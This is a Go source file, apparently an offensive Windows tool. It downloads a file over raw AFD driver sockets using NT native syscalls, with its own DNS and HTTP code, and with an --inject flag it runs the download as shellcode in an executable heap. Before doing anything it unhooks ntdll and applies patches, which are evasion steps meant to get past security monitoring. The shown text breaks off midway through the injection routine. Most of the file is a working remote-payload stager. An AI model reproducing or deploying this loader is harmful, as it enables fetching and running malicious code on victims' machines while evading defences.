package main

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
	"unsafe"

	"github.com/carved4/go-native-syscall"
)
 
const (
	AF_INET         = 2
	SOCK_STREAM     = 1
	SOCK_DGRAM      = 2
	IPPROTO_TCP     = 6
	IPPROTO_UDP     = 17
	INADDR_ANY      = 0
	AFD_SHARE_REUSE = 2

	IOCTL_AFD_BIND    = 0x00012003
	IOCTL_AFD_CONNECT = 0x00012007
	IOCTL_AFD_SEND    = 0x0001201F
	IOCTL_AFD_RECV    = 0x00012017

	GENERIC_READ  = 0x80000000
	GENERIC_WRITE = 0x40000000
	FILE_WRITE    = 0xC0140000

	CREATE_ALWAYS = 2
)

type NTError struct {
	Status  uintptr
	Message string
	Context string
}

func (e NTError) Error() string {
	return fmt.Sprintf("[ERROR] NTSTATUS: 0x%08X (%s) in %s", e.Status, e.Message, e.Context)
}

type NTSocketData struct {
	Socket      uintptr
	StatusEvent uintptr
}

type SockAddrIn struct {
	Family uint16
	Port   uint16
	Addr   uint32
	Zero   [8]byte
}

type BindData struct {
	Unknown1 uint32
	SockAddr SockAddrIn
}


type AFDConnectInfo struct {
	UseSan  uintptr
	Root    uintptr
	Unknown uintptr
	Address SockAddrIn
}


type DataBuffer struct {
	DataLength uint32
	Data       *byte
}


type SendRecvData struct {
	BufferList   *DataBuffer
	BufferCount  uint32
	Unknown1     uint32
	Unknown2     uint32
}


type DNSHeader struct {
	TransID       uint16
	Flags         uint16
	QuestionCount uint16
	AnswerCount   uint16
	AuthorityCount uint16
	AdditionalCount uint16
}

type DNSQueryDetails struct {
	Type  uint16
	Class uint16
}

func nstatusToMessage(status uintptr) string {
	switch status {
	case 0xC000000D:
		return "STATUS_INVALID_PARAMETER"
	case 0xC0000022:
		return "STATUS_ACCESS_DENIED"
	case 0xC0000008:
		return "STATUS_INVALID_HANDLE"
	default:
		return fmt.Sprintf("Unknown NTSTATUS 0x%08X", status)
	}
}

func createTCPSocket(isUDP bool) (*NTSocketData, error) {
	context := "createTCPSocket"
	
	var eventHandle uintptr = 0
	fmt.Printf("[+] Event created successfully, handle: 0x%x\n", eventHandle)


	devicePath := "\\Device\\Afd\\Endpoint"
	devicePathUTF16 := winapi.StringToUTF16(devicePath)
	
	unicodeString := winapi.UNICODE_STRING{
		Length:        uint16(len(devicePath) * 2),
		MaximumLength: uint16((len(devicePath) + 1) * 2),
		Buffer:        devicePathUTF16,
	}

	objectAttributes := winapi.OBJECT_ATTRIBUTES{
		Length:     uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
		ObjectName: &unicodeString,
		Attributes: winapi.OBJ_CASE_INSENSITIVE,
	}

	extendedAttributes := [64]byte{
		0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1E, 0x00,
		0x41, 0x66, 0x64, 0x4F, 0x70, 0x65, 0x6E, 0x50,
		0x61, 0x63, 0x6B, 0x65, 0x74, 0x58, 0x58, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
		0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	}


	addressFamily := uint32(AF_INET)
	var socketType, protocol uint32
	
	if isUDP {
		socketType = SOCK_DGRAM
		protocol = IPPROTO_UDP
	} else {
		socketType = SOCK_STREAM
		protocol = IPPROTO_TCP
	}

		// Copy parameters to extended attributes
	copy(extendedAttributes[32:36], (*[4]byte)(unsafe.Pointer(&addressFamily))[:])
	copy(extendedAttributes[36:40], (*[4]byte)(unsafe.Pointer(&socketType))[:])
	copy(extendedAttributes[40:44], (*[4]byte)(unsafe.Pointer(&protocol))[:])
	
	if isUDP {
		copy(extendedAttributes[24:28], (*[4]byte)(unsafe.Pointer(&protocol))[:])
	}

	fmt.Printf("[+] Address Family: %d, Socket Type: %d, Protocol: %d\n", addressFamily, socketType, protocol)

	var socketHandle uintptr
	var ioStatusBlock winapi.IO_STATUS_BLOCK
	
	status, err := winapi.NtCreateFile(
		&socketHandle,
		uintptr(0xC0140000),
		uintptr(unsafe.Pointer(&objectAttributes)),
		uintptr(unsafe.Pointer(&ioStatusBlock)),
		nil,
		uintptr(0),
		uintptr(winapi.FILE_SHARE_READ|winapi.FILE_SHARE_WRITE),
		uintptr(winapi.FILE_OPEN),
		uintptr(0),
		unsafe.Pointer(&extendedAttributes[0]),
		uintptr(len(extendedAttributes)),
	)

	if err != nil || status != 0 {
		winapi.NtClose(eventHandle)
		return nil, NTError{
			Status:  status,
			Message: nstatusToMessage(status),
			Context: fmt.Sprintf("%s: NtCreateFile", context),
		}
	}

	fmt.Printf("[+] Socket Success, handle: 0x%x\n", socketHandle)
	
	return &NTSocketData{
		Socket:      socketHandle,
		StatusEvent: eventHandle,
	}, nil
}

func socketDriverMsg(socketData *NTSocketData, ioControlCode uint32, inputBuffer unsafe.Pointer, inputBufferLength uint32, outputInfo *uint32, timeoutMs uint32) error {
	context := fmt.Sprintf("socketDriverMsg: IOCTL 0x%08X", ioControlCode)
	var ioStatusBlock winapi.IO_STATUS_BLOCK
	

	var internalOutputBuffer [40]byte
	var outputBufferPtr unsafe.Pointer
	var outputBufferLen uint32

	switch ioControlCode {
	case IOCTL_AFD_RECV, IOCTL_AFD_SEND:
		outputBufferPtr = nil
		outputBufferLen = 0
	case IOCTL_AFD_BIND:
		outputBufferPtr = unsafe.Pointer(&internalOutputBuffer[0])
		outputBufferLen = uint32(len(internalOutputBuffer))
	default:
		outputBufferPtr = nil
		outputBufferLen = 0
	}

	if socketData.StatusEvent != 0 {
		var previousState uintptr
		winapi.NtResetEvent(socketData.StatusEvent, &previousState)
	}


	eventToUse := socketData.StatusEvent
	
	status, err := winapi.NtDeviceIoControlFile(
		socketData.Socket,
		eventToUse,
		uintptr(0), // ApcRoutine
		uintptr(0), // ApcContext
		uintptr(unsafe.Pointer(&ioStatusBlock)),
		uintptr(ioControlCode),
		inputBuffer,
		uintptr(inputBufferLength),
		outputBufferPtr,
		uintptr(outputBufferLen),
	)

	
	if err != nil {
		return NTError{
			Status:  status,
			Message: err.Error(),
			Context: context,
		}
	}


	const STATUS_PENDING = 0x00000103

	if status == STATUS_PENDING {

		if eventToUse != 0 {

			var timeout *uint64
			if timeoutMs != ^uint32(0) {
				timeoutValue := uint64(timeoutMs) * 10000
				timeout = &timeoutValue
			}
			
			waitStatus, waitErr := winapi.NtWaitForSingleObject(socketData.StatusEvent, false, timeout)
			
			if waitErr != nil {
				return NTError{
					Status:  0,
					Message: fmt.Sprintf("Wait error: %v", waitErr),
					Context: context,
				}
			}
			
			if waitStatus != 0 {
				return NTError{
					Status:  waitStatus,
					Message: fmt.Sprintf("Wait failed with status: 0x%08X", waitStatus),
					Context: context,
				}
			}
		} else {
			fmt.Printf("[+] STATUS_PENDING but no event handle, operation may be synchronous\n")
		}


		finalStatus := *(*uintptr)(unsafe.Pointer(&ioStatusBlock))
		if finalStatus != 0 {
			return NTError{
				Status:  finalStatus,
				Message: nstatusToMessage(finalStatus),
				Context: fmt.Sprintf("%s: IO_STATUS_BLOCK", context),
			}
		}
	} else if status != 0 {
		return NTError{
			Status:  status,
			Message: nstatusToMessage(status),
			Context: fmt.Sprintf("%s: NtDeviceIoControlFile", context),
		}
	}


	if outputInfo != nil {
		*outputInfo = uint32(ioStatusBlock.Information)
	}

	return nil
}

func convertIP(ip string) (uint32, error) {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return 0, fmt.Errorf("invalid IP address: %s", ip)
	}

	var addr uint32
	for i, part := range parts {
		octet, err := strconv.Atoi(part)
		if err != nil || octet < 0 || octet > 255 {
			return 0, fmt.Errorf("invalid IP octet: %s", part)
		}
		addr |= uint32(octet) << (i * 8)
	}

	return addr, nil
}

func swap16BitByteOrder(value uint16) uint16 {
	return ((value & 0xFF) << 8) | ((value >> 8) & 0xFF)
}

func connectSocket(socketData *NTSocketData, ip string, port uint16) error {
	// Bind to local port
	bindData := BindData{
		Unknown1: AFD_SHARE_REUSE,
		SockAddr: SockAddrIn{
			Family: AF_INET,
			Port:   0,
			Addr:   INADDR_ANY,
		},
	}

	fmt.Printf("[+] Attempting to bind socket...\n")
	err := socketDriverMsg(
		socketData,
		IOCTL_AFD_BIND,
		unsafe.Pointer(&bindData),
		uint32(unsafe.Sizeof(bindData)),
		nil,
		5000,
	)
	if err != nil {
		return fmt.Errorf("bind failed: %v", err)
	}
	fmt.Printf("[+] Socket bound successfully\n")


	connectAddr, err := convertIP(ip)
	if err != nil {
		return err
	}


	connectData := AFDConnectInfo{
		UseSan:  0,
		Root:    0,
		Unknown: 0,
		Address: SockAddrIn{
			Family: AF_INET,
			Port:   swap16BitByteOrder(port),
			Addr:   connectAddr,
		},
	}

	fmt.Printf("[+] Attempting to connect to %s:%d...\n", ip, port)
	err = socketDriverMsg(
		socketData,
		IOCTL_AFD_CONNECT,
		unsafe.Pointer(&connectData),
		uint32(unsafe.Sizeof(connectData)),
		nil,
		10000,
	)
	if err != nil {
		return fmt.Errorf("connect failed: %v", err)
	}
	fmt.Printf("[+] Connected successfully\n")
	return nil
}

func sendData(socketData *NTSocketData, data []byte) error {
	if len(data) == 0 {
		return nil
	}
	
	bytesRemaining := uint32(len(data))
	currentOffset := 0

	for bytesRemaining > 0 {
		dataBuffer := DataBuffer{
			DataLength: bytesRemaining,
			Data:       &data[currentOffset],
		}

		sendDataStruct := SendRecvData{
			BufferList:  &dataBuffer,
			BufferCount: 1,
			Unknown1:    0,
			Unknown2:    0,
		}

		var bytesSent uint32
		err := socketDriverMsg(
			socketData,
			IOCTL_AFD_SEND,
			unsafe.Pointer(&sendDataStruct),
			uint32(unsafe.Sizeof(sendDataStruct)),
			&bytesSent,
			^uint32(0),
		)
		if err != nil {
			return err
		}

		if bytesSent == 0 {
			return fmt.Errorf("no bytes sent, connection may be closed")
		}

		currentOffset += int(bytesSent)
		bytesRemaining -= bytesSent
	}

	return nil
}

func recvData(socketData *NTSocketData, buffer []byte) error {
	return recvDataWithTimeout(socketData, buffer, 1000)
}

func recvDataWithTimeout(socketData *NTSocketData, buffer []byte, timeoutMs uint32) error {
	if len(buffer) == 0 {
		return nil
	}
	
	bytesRemaining := uint32(len(buffer))
	currentOffset := 0

	for bytesRemaining > 0 {
		dataBuffer := DataBuffer{
			DataLength: bytesRemaining,
			Data:       &buffer[currentOffset],
		}

		recvDataStruct := SendRecvData{
			BufferList:  &dataBuffer,
			BufferCount: 1,
			Unknown1:    0,
			Unknown2:    0x20,
		}

		var bytesReceived uint32
		maxRetries := 5
		var lastErr error
		
		for retry := 0; retry < maxRetries; retry++ {
			err := socketDriverMsg(
				socketData,
				IOCTL_AFD_RECV,
				unsafe.Pointer(&recvDataStruct),
				uint32(unsafe.Sizeof(recvDataStruct)),
				&bytesReceived,
				timeoutMs,
			)
			if err != nil {
				lastErr = err
				time.Sleep(100 * time.Millisecond)
				continue
			}

			if bytesReceived == 0 {

				time.Sleep(50 * time.Millisecond)
				continue
			}


			break
		}

		if bytesReceived == 0 {
			if lastErr != nil {
				return fmt.Errorf("error receiving data after %d retries: %v", maxRetries, lastErr)
			}
			return fmt.Errorf("no bytes received after %d retries, connection may be closed", maxRetries)
		}

		currentOffset += int(bytesReceived)
		bytesRemaining -= bytesReceived
	}

	return nil
}

func closeSocket(socketData *NTSocketData) {
	if socketData.Socket != 0 {
		winapi.NtClose(socketData.Socket)
	}
	if socketData.StatusEvent != 0 {
		winapi.NtClose(socketData.StatusEvent)
	}
}

func dnsClientQuery(dnsIP, targetHost string) (string, error) {

	var hostBytes []byte
	parts := strings.Split(targetHost, ".")
	for _, part := range parts {
		if len(part) == 0 || len(part) >= 64 {
			return "", fmt.Errorf("invalid DNS label length for part: '%s'", part)
		}
		hostBytes = append(hostBytes, byte(len(part)))
		hostBytes = append(hostBytes, []byte(part)...)
	}
	hostBytes = append(hostBytes, 0)

	fmt.Printf("[+] Host: %s\n", targetHost)
	fmt.Printf("[+] Convert as HOST\n")
	fmt.Printf("DNS Query Host Bytes: %v\n", hostBytes)

	socketData, err := createTCPSocket(true)
	if err != nil {
		return "", err
	}
	defer closeSocket(socketData)

	fmt.Println("[+] UDP Socket Created Successfully")

	bindData := BindData{
		Unknown1: AFD_SHARE_REUSE,
		SockAddr: SockAddrIn{
			Family: AF_INET,
			Port:   0,
			Addr:   INADDR_ANY,
		},
	}

	err = socketDriverMsg(
		socketData,
		IOCTL_AFD_BIND,
		unsafe.Pointer(&bindData),
		uint32(unsafe.Sizeof(bindData)),
		nil,
		^uint32(0),
	)
	if err != nil {
		return "", err
	}

	fmt.Println("[+] UDP Socket Bound Successfully (Ephemeral Port)")

	connectAddr, err := convertIP(dnsIP)
	if err != nil {
		return "", err
	}

	connectData := AFDConnectInfo{
		UseSan:  0,
		Root:    0,
		Unknown: 0,
		Address: SockAddrIn{
			Family: AF_INET,
			Port:   swap16BitByteOrder(53),
			Addr:   connectAddr,
		},
	}

	err = socketDriverMsg(
		socketData,
		IOCTL_AFD_CONNECT,
		unsafe.Pointer(&connectData),
		uint32(unsafe.Sizeof(connectData)),
		nil,
		^uint32(0),
	)
	if err != nil {
		return "", err
	}

	fmt.Println("[+] Connected to DNS Server")

	requestHeader := DNSHeader{
		TransID:         swap16BitByteOrder(0x1337),
		Flags:           swap16BitByteOrder(0x0100),
		QuestionCount:   swap16BitByteOrder(1),
		AnswerCount:     0,
		AuthorityCount:  0,
		AdditionalCount: 0,
	}

	queryDetails := DNSQueryDetails{
		Type:  swap16BitByteOrder(1), // Type A
		Class: swap16BitByteOrder(1), // Class IN
	}

	headerBytes := (*[12]byte)(unsafe.Pointer(&requestHeader))[:]
	queryDetailsBytes := (*[4]byte)(unsafe.Pointer(&queryDetails))[:]

	fullDNSQueryPacket := make([]byte, 0, len(headerBytes)+len(hostBytes)+len(queryDetailsBytes))
	fullDNSQueryPacket = append(fullDNSQueryPacket, headerBytes...)
	fullDNSQueryPacket = append(fullDNSQueryPacket, hostBytes...)
	fullDNSQueryPacket = append(fullDNSQueryPacket, queryDetailsBytes...)

	fmt.Printf("Sending DNS Query Packet (%d bytes)\n", len(fullDNSQueryPacket))
	err = sendData(socketData, fullDNSQueryPacket)
	if err != nil {
		return "", err
	}


	responseBuffer := make([]byte, 512)
	
	dataBuffer := DataBuffer{
		DataLength: uint32(len(responseBuffer)),
		Data:       &responseBuffer[0],
	}

	recvDataStruct := SendRecvData{
		BufferList:  &dataBuffer,
		BufferCount: 1,
		Unknown1:    0,
		Unknown2:    0x20, // TDI_RECEIVE_NORMAL
	}

	var bytesReceived uint32
	err = socketDriverMsg(
		socketData,
		IOCTL_AFD_RECV,
		unsafe.Pointer(&recvDataStruct),
		uint32(unsafe.Sizeof(recvDataStruct)),
		&bytesReceived,
		5000,
	)
	if err != nil {
		return "", err
	}

	responseBuffer = responseBuffer[:bytesReceived]
	fmt.Printf("Received DNS Response (%d bytes): %v\n", len(responseBuffer), responseBuffer)

	if len(responseBuffer) < 12 {
		return "", fmt.Errorf("DNS response too short for header")
	}

	responseFlags := (uint16(responseBuffer[2]) << 8) | uint16(responseBuffer[3])
	responseQuestionCount := (uint16(responseBuffer[4]) << 8) | uint16(responseBuffer[5])
	responseAnswerCount := (uint16(responseBuffer[6]) << 8) | uint16(responseBuffer[7])

	if (responseFlags&0x8000 == 0) || // QR bit not set
		((responseFlags>>0)&0xF != 0) || // RCODE not 0
		responseQuestionCount != 1 {
		return "", fmt.Errorf("invalid DNS response header. Flags: 0x%X, Questions: %d", responseFlags, responseQuestionCount)
	}


	currentOffset := 12
	for currentOffset < len(responseBuffer) {
		labelLenOrPointer := responseBuffer[currentOffset]
		if (labelLenOrPointer & 0xC0) == 0xC0 {
			currentOffset += 2
			break
		} else if labelLenOrPointer == 0 {
			currentOffset++
			break
		} else {
			currentOffset += int(labelLenOrPointer) + 1
		}
	}
	currentOffset += 4

	var ipAddr [4]byte
	foundRecord := false

	for i := 0; i < int(responseAnswerCount); i++ {
		if currentOffset+2 > len(responseBuffer) {
			return "", fmt.Errorf("DNS response too short for answer record name field")
		}

		nameFieldByte1 := responseBuffer[currentOffset]
		if (nameFieldByte1 & 0xC0) == 0xC0 {
			currentOffset += 2
		} else {
			for currentOffset < len(responseBuffer) && responseBuffer[currentOffset] != 0 {
				currentOffset += int(responseBuffer[currentOffset]) + 1
			}
			currentOffset++
		}

		if currentOffset+10 > len(responseBuffer) {
			return "", fmt.Errorf("DNS response too short for answer fixed part")
		}

		recordType := (uint16(responseBuffer[currentOffset]) << 8) | uint16(responseBuffer[currentOffset+1])
		recordClass := (uint16(responseBuffer[currentOffset+2]) << 8) | uint16(responseBuffer[currentOffset+3])
		dataLength := (uint16(responseBuffer[currentOffset+8]) << 8) | uint16(responseBuffer[currentOffset+9])

		currentOffset += 10

		if recordType == 1 && recordClass == 1 { // A record
			if dataLength != 4 {
				return "", fmt.Errorf("invalid DNS A record data length: %d", dataLength)
			}

			if currentOffset+4 > len(responseBuffer) {
				return "", fmt.Errorf("DNS response too short for IP address data")
			}

			copy(ipAddr[:], responseBuffer[currentOffset:currentOffset+4])
			foundRecord = true
			break
		}

		currentOffset += int(dataLength)
	}

	if !foundRecord {
		return "", fmt.Errorf("no valid A record found in DNS response")
	}

	return fmt.Sprintf("%d.%d.%d.%d", ipAddr[0], ipAddr[1], ipAddr[2], ipAddr[3]), nil
}

func downloadFile(url string) ([]byte, error) {

	if !strings.HasPrefix(url, "http://") {
		return nil, fmt.Errorf("URL must start with http://")
	}

	fmt.Println("[+] url start success")


	startOfHostname := url[7:]
	endOfHostnameOrPath := strings.Index(startOfHostname, "/")
	if endOfHostnameOrPath == -1 {
		endOfHostnameOrPath = len(startOfHostname)
	}

	hostnameWithPort := startOfHostname[:endOfHostnameOrPath]
	requestPath := startOfHostname[endOfHostnameOrPath:]
	if requestPath == "" {
		requestPath = "/"
	}

	fmt.Println("[+] url parse success")


	var hostname string
	port := uint16(80)

	if portIdx := strings.Index(hostnameWithPort, ":"); portIdx != -1 {
		hostname = hostnameWithPort[:portIdx]
		portStr := hostnameWithPort[portIdx+1:]
		if p, err := strconv.Atoi(portStr); err == nil && p > 0 && p <= 65535 {
			port = uint16(p)
		} else {
			return nil, fmt.Errorf("invalid port: %s", portStr)
		}
	} else {
		hostname = hostnameWithPort
	}



	var resolvedIP string
	if _, err := convertIP(hostname); err == nil {
		fmt.Println("[+] hostname is a direct IP address.")
		resolvedIP = hostname
	} else if hostname == "localhost" {
		fmt.Println("[+] localhost detected, using 127.0.0.1")
		resolvedIP = "127.0.0.1"
	} else {
		fmt.Println("[+] dns query :3")
		var err error
		resolvedIP, err = dnsClientQuery("8.8.8.8", hostname)
		if err != nil {
			return nil, err
		}
	}

	fmt.Printf("[+] hostname successfully resolved to: %s\n", resolvedIP)


	socketData, err := createTCPSocket(false)
	if err != nil {
		return nil, err
	}
	defer closeSocket(socketData)

	fmt.Println("[+] socket created successfully")


	err = connectSocket(socketData, resolvedIP, port)
	if err != nil {
		return nil, fmt.Errorf("connecting to server: %v", err)
	}


	requestHeader := fmt.Sprintf("GET %s HTTP/1.0\r\nHost: %s\r\n\r\n", requestPath, hostname)
	fmt.Printf("Sent HTTP request:\n%s", requestHeader)
	
	err = sendData(socketData, []byte(requestHeader))
	if err != nil {
		return nil, err
	}


	headerBuffer := make([]byte, 1024)
	err = recvDataWithTimeout(socketData, headerBuffer[:1], 10000) // Get first byte with longer timeout
	if err != nil {
		return nil, fmt.Errorf("error receiving first byte of HTTP header: %v", err)
	}
	

	var responseHeader strings.Builder
	responseHeader.WriteByte(headerBuffer[0]) // Add the first byte
	endOfHeader := "\r\n\r\n"
	
	for responseHeader.Len() < 4096 {
		err = recvData(socketData, headerBuffer[:1])
		if err != nil {
			return nil, fmt.Errorf("error receiving HTTP header: %v", err)
		}

		responseHeader.WriteByte(headerBuffer[0])

		if responseHeader.Len() >= len(endOfHeader) &&
			strings.HasSuffix(responseHeader.String(), endOfHeader) {
			break
		}
	}
	
	if responseHeader.Len() >= 4096 {
		return nil, fmt.Errorf("HTTP response header too large or missing end sequence")
	}

	headerStr := responseHeader.String()
	
	// HACK: If we're missing the first 'H' from HTTP, just add it back!
	if strings.HasPrefix(headerStr, "TTP/1.") {
		headerStr = "H" + headerStr
		fmt.Printf("[HACK] prepended missing 'H' to HTTP response!\n")
	}
	
	fmt.Printf("Received HTTP response:\n%s", headerStr)

	// Check status code
	if !strings.HasPrefix(headerStr, "HTTP/1.0 200 OK\r\n") && !strings.HasPrefix(headerStr, "HTTP/1.1 200 OK\r\n") {
		lines := strings.Split(headerStr, "\r\n")
		statusLine := ""
		if len(lines) > 0 {
			statusLine = lines[0]
		}
		return nil, fmt.Errorf("invalid HTTP response status code. Header: %s", statusLine)
	}

	// Get content length
	var outputData []byte
	headerUpper := strings.ToUpper(headerStr)

	if contentLengthPos := strings.Index(headerUpper, "CONTENT-LENGTH: "); contentLengthPos != -1 {
		contentLengthStart := contentLengthPos + 16
		contentLengthEnd := strings.Index(headerStr[contentLengthStart:], "\r\n")
		if contentLengthEnd == -1 {
			return nil, fmt.Errorf("invalid HTTP response header: Missing content length value")
		}
		
		contentLengthStr := strings.TrimSpace(headerStr[contentLengthStart : contentLengthStart+contentLengthEnd])
		contentLength, err := strconv.Atoi(contentLengthStr)
		if err != nil {
			return nil, fmt.Errorf("invalid content length format: %s", contentLengthStr)
		}

		if contentLength > 0 {
			outputData = make([]byte, contentLength)
			err = recvData(socketData, outputData)
			if err != nil {
				return nil, err
			}
		}
	} else {
		// Read until socket closes
		var byteBuffer [1]byte
		for {
			err = recvData(socketData, byteBuffer[:])
			if err != nil {
				break // Assuming error means EOF
			}
			outputData = append(outputData, byteBuffer[0])
		}
	}

	return outputData, nil
}

func verifyDownloadedContent(data []byte, url string) bool {
	if len(data) == 0 {
		fmt.Printf("[!] verification failed: empty data\n")
		return false
	}
	

	dataStr := string(data[:min(len(data), 100)]) // Check first 100 bytes
	
	// Detect if we got ntdll function names (this is a hack, on my machine sometimes it would return a dump of rtl functions from ntdll which is so fucking strange to me and i could not figure out why)
	if strings.Contains(dataStr, "Rtl") || strings.Contains(dataStr, "Nt") {
		fmt.Printf("[!] verification failed: detected Windows API function names (memory corruption)\n")
		fmt.Printf("[!] corrupted data preview: %q\n", dataStr)
		return false
	}
	
	// Check if this looks like our test.txt file
	if strings.Contains(url, "test.txt") {
		if len(data) < 5 || !strings.HasPrefix(dataStr, "hello") {
			fmt.Printf("[!] verification failed: test.txt should start with 'hello', got: %q\n", dataStr[:min(len(dataStr), 20)])
			return false
		}
		return true
	}
	
	// For calc.bin, check it's binary data with reasonable size
	if strings.Contains(url, "calc.bin") {
		if len(data) < 50 || len(data) > 1000 {
			fmt.Printf("[!] verification failed: calc.bin size %d bytes (expected 50-1000)\n", len(data))
			return false
		}
		// Make sure it's not ASCII text (should be binary)
		for i := 0; i < min(len(data), 20); i++ {
			if data[i] > 127 || (data[i] < 32 && data[i] != 0) {
				break // Found non-ASCII, looks good
			}
			if i == min(len(data), 20)-1 {
				fmt.Printf("[!] verification failed: calc.bin appears to be text, not binary\n")
				return false
			}
		}
		return true
	}
	

	if strings.Contains(dataStr, "Rtl") || strings.Contains(dataStr, "Nt") {
		fmt.Printf("[!] verification failed: detected corruption in unknown file type\n")
		return false
	}
	
	return len(data) > 0
}

// fuck you go 1.23
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}


// Hack to not get corrupted data back 
func downloadFileWithRetry(url string) ([]byte, error) {
	maxRetries := 3
	
	for attempt := 1; attempt <= maxRetries; attempt++ {
		fmt.Printf("[+] download attempt %d/%d\n", attempt, maxRetries)
		
		data, err := downloadFile(url)
		if err != nil {
			fmt.Printf("[!] download failed: %v\n", err)
			if attempt < maxRetries {
				fmt.Printf("[+] retrying in 1 second...\n")
				time.Sleep(1 * time.Second)
				continue
			}
			return nil, err
		}
		
		if !verifyDownloadedContent(data, url) {
			fmt.Printf("[!] downloaded content appears corrupted (attempt %d/%d)\n", attempt, maxRetries)
			if attempt < maxRetries {
				fmt.Printf("[+] retrying in 1 second...\n")
				time.Sleep(1 * time.Second)
				continue
			}
			return nil, fmt.Errorf("downloaded content verification failed after %d attempts", maxRetries)
		}
		
		fmt.Printf("[+] content verification passed\n")
		return data, nil
	}
	
	return nil, fmt.Errorf("download failed after %d attempts", maxRetries)
}

func createNTFile(outputPath string, data []byte) error {

	var ntPath string
	// wow this is needlessly complicated
	if len(outputPath) > 1 && outputPath[1] == ':' {
		ntPath = `\??\` + outputPath
	} else {
		currentDir, err := os.Getwd()
		if err != nil {
			return fmt.Errorf("getting current directory: %v", err)
		}
		currentDir = strings.ReplaceAll(currentDir, "/", "\\")
		ntPath = `\??\` + currentDir + `\` + outputPath
	}
	
	fmt.Printf("[+] NT Path: %s\n", ntPath)
	

	ntPathUTF16 := winapi.StringToUTF16(ntPath)
	unicodeString := winapi.UNICODE_STRING{
		Length:        uint16(len(ntPath) * 2),
		MaximumLength: uint16((len(ntPath) + 1) * 2),
		Buffer:        ntPathUTF16,
	}

	objectAttributes := winapi.OBJECT_ATTRIBUTES{
		Length:     uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
		ObjectName: &unicodeString,
		Attributes: 0,
	}

	var fileHandle uintptr
	var ioStatusBlock winapi.IO_STATUS_BLOCK

	status, err := winapi.NtCreateFile(
		&fileHandle,
		uintptr(GENERIC_WRITE),
		uintptr(unsafe.Pointer(&objectAttributes)),
		uintptr(unsafe.Pointer(&ioStatusBlock)),
		nil,
		uintptr(0),
		uintptr(0),
		uintptr(CREATE_ALWAYS),
		uintptr(0),
		nil,
		uintptr(0),
	)

	if err != nil || status != 0 {
		return fmt.Errorf("NtCreateFile failed: NTSTATUS 0x%08X, %v", status, err)
	}
	defer winapi.NtClose(fileHandle)

	// Write data to file
	maxLen := len(data)
	if maxLen > 50 {
		maxLen = 50
	}

	if len(data) > 0 {
		ioStatusBlock = winapi.IO_STATUS_BLOCK{}
		
		var byteOffset uint64 = 0
		var key uintptr = 0
		
		status, err = winapi.NtWriteFile(
			fileHandle,
			uintptr(0), // Event
			uintptr(0), // ApcRoutine
			uintptr(0), // ApcContext
			uintptr(unsafe.Pointer(&ioStatusBlock)),
			unsafe.Pointer(&data[0]),
			uintptr(len(data)),
			&byteOffset, // ByteOffset (write at current position)
			&key,        // Key
		)

		// STATUS_PENDING (0x103) is success for async operations
		if err != nil || (status != 0 && status != 0x103) {
			return fmt.Errorf("NtWriteFile failed: NTSTATUS 0x%08X, %v", status, err)
		}

		// For async operations (STATUS_PENDING), the byte count may not be immediately available
		if status == 0x103 {
			fmt.Printf("[+] file write operation completed asynchronously\n")
		} else {
			// Check bytes written from IO_STATUS_BLOCK for synchronous operations
			bytesWritten := ioStatusBlock.Information
			fmt.Printf("[+] successfully wrote %d bytes to file\n", bytesWritten)
		}
	} else {
		fmt.Printf("[+] no data to write to file\n")
	}

	return nil
}


func main() {
	winapi.UnhookNtdll()
	winapi.ApplyAllPatches()
	args := os.Args
	if len(args) < 3 {
		fmt.Printf("[+] usage: %s [url] [output_file_path] [--inject]\n", args[0])
		fmt.Printf("[+] [url] 'dummy' --inject: Download as shellcode and inject into current process instead of saving to file\n")
		os.Exit(1)
	}

	url := args[1]
	outputPath := args[2]
	injectMode := len(args) > 3 && args[3] == "--inject"

	fmt.Printf("Downloading file: %s\n", url)
	if injectMode {
		fmt.Println("Mode: Shellcode Injection")
	} else {
		fmt.Println("Mode: File Download")
	}
	fmt.Println()

	// Download file with retry and verification
	outputData, err := downloadFileWithRetry(url)
	if err != nil {
		fmt.Printf("Error downloading file: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[+] downloaded %d bytes successfully [+]\n\n", len(outputData))

	if injectMode {
		// Inject as shellcode
		err = injectShellcode(outputData)
		if err != nil {
			fmt.Printf("Error injecting shellcode: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("Shellcode execution completed!")
	} else {
		// Save to file
		fmt.Printf("Creating output file: %s\n\n", outputPath)
		err = createNTFile(outputPath, outputData)
		if err != nil {
			fmt.Printf("Error creating file: %v\n", err)
			os.Exit(1)
		}
	}

	fmt.Println("[+] finished [+]")
}



func injectShellcode(shellcode []byte) error {
	
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode is empty")
	}
	
	size := uintptr(len(shellcode))
	
	fmt.Printf("[+] creating private heap...\n")

	heapHandle, err := winapi.CallNtdllFunction("RtlCreateHeap", 
		uintptr(0x00040000), // HEAP_CREATE_ENABLE_EXECUTE 
		uintptr(0),          // HeapBase (let system choose)
		uintptr(0),          // ReserveSize (0 = default)
		uintptr(0),          // CommitSize (0 = default)
		uintptr(0),          // Lock (0 = no lock)
		uintptr(0),          // Parameters (0 = default)
	)
	if err != nil {
		return fmt.Errorf("RtlCreateHeap failed: %v", err)
	}
	
	if heapHandle == 0 {
		return fmt.Errorf("RtlCreateHeap returned NULL heap")
	}
	
	fmt.Printf("[+] Created heap handle: 0x%x\n", heapHandle)
	fmt.Printf("[+] allocating %d bytes from private heap...\n", size)
	
	baseAddress, err := winapi.CallNtdllFunction("RtlAllocateHeap", heapHandle, uintptr(0x00000008), size)
	if err != nil {
		winapi.CallNtdllFunction("RtlDestroyHeap", heapHandle)
		return fmt.Errorf("RtlAllocateHeap failed: %v", err)
	}
	
	if baseAddress == 0 {
		winapi.CallNtdllFunction("RtlDestroyHeap", heapHandle)
		return fmt.Errorf("heap allocation returned NULL address")
	}
	
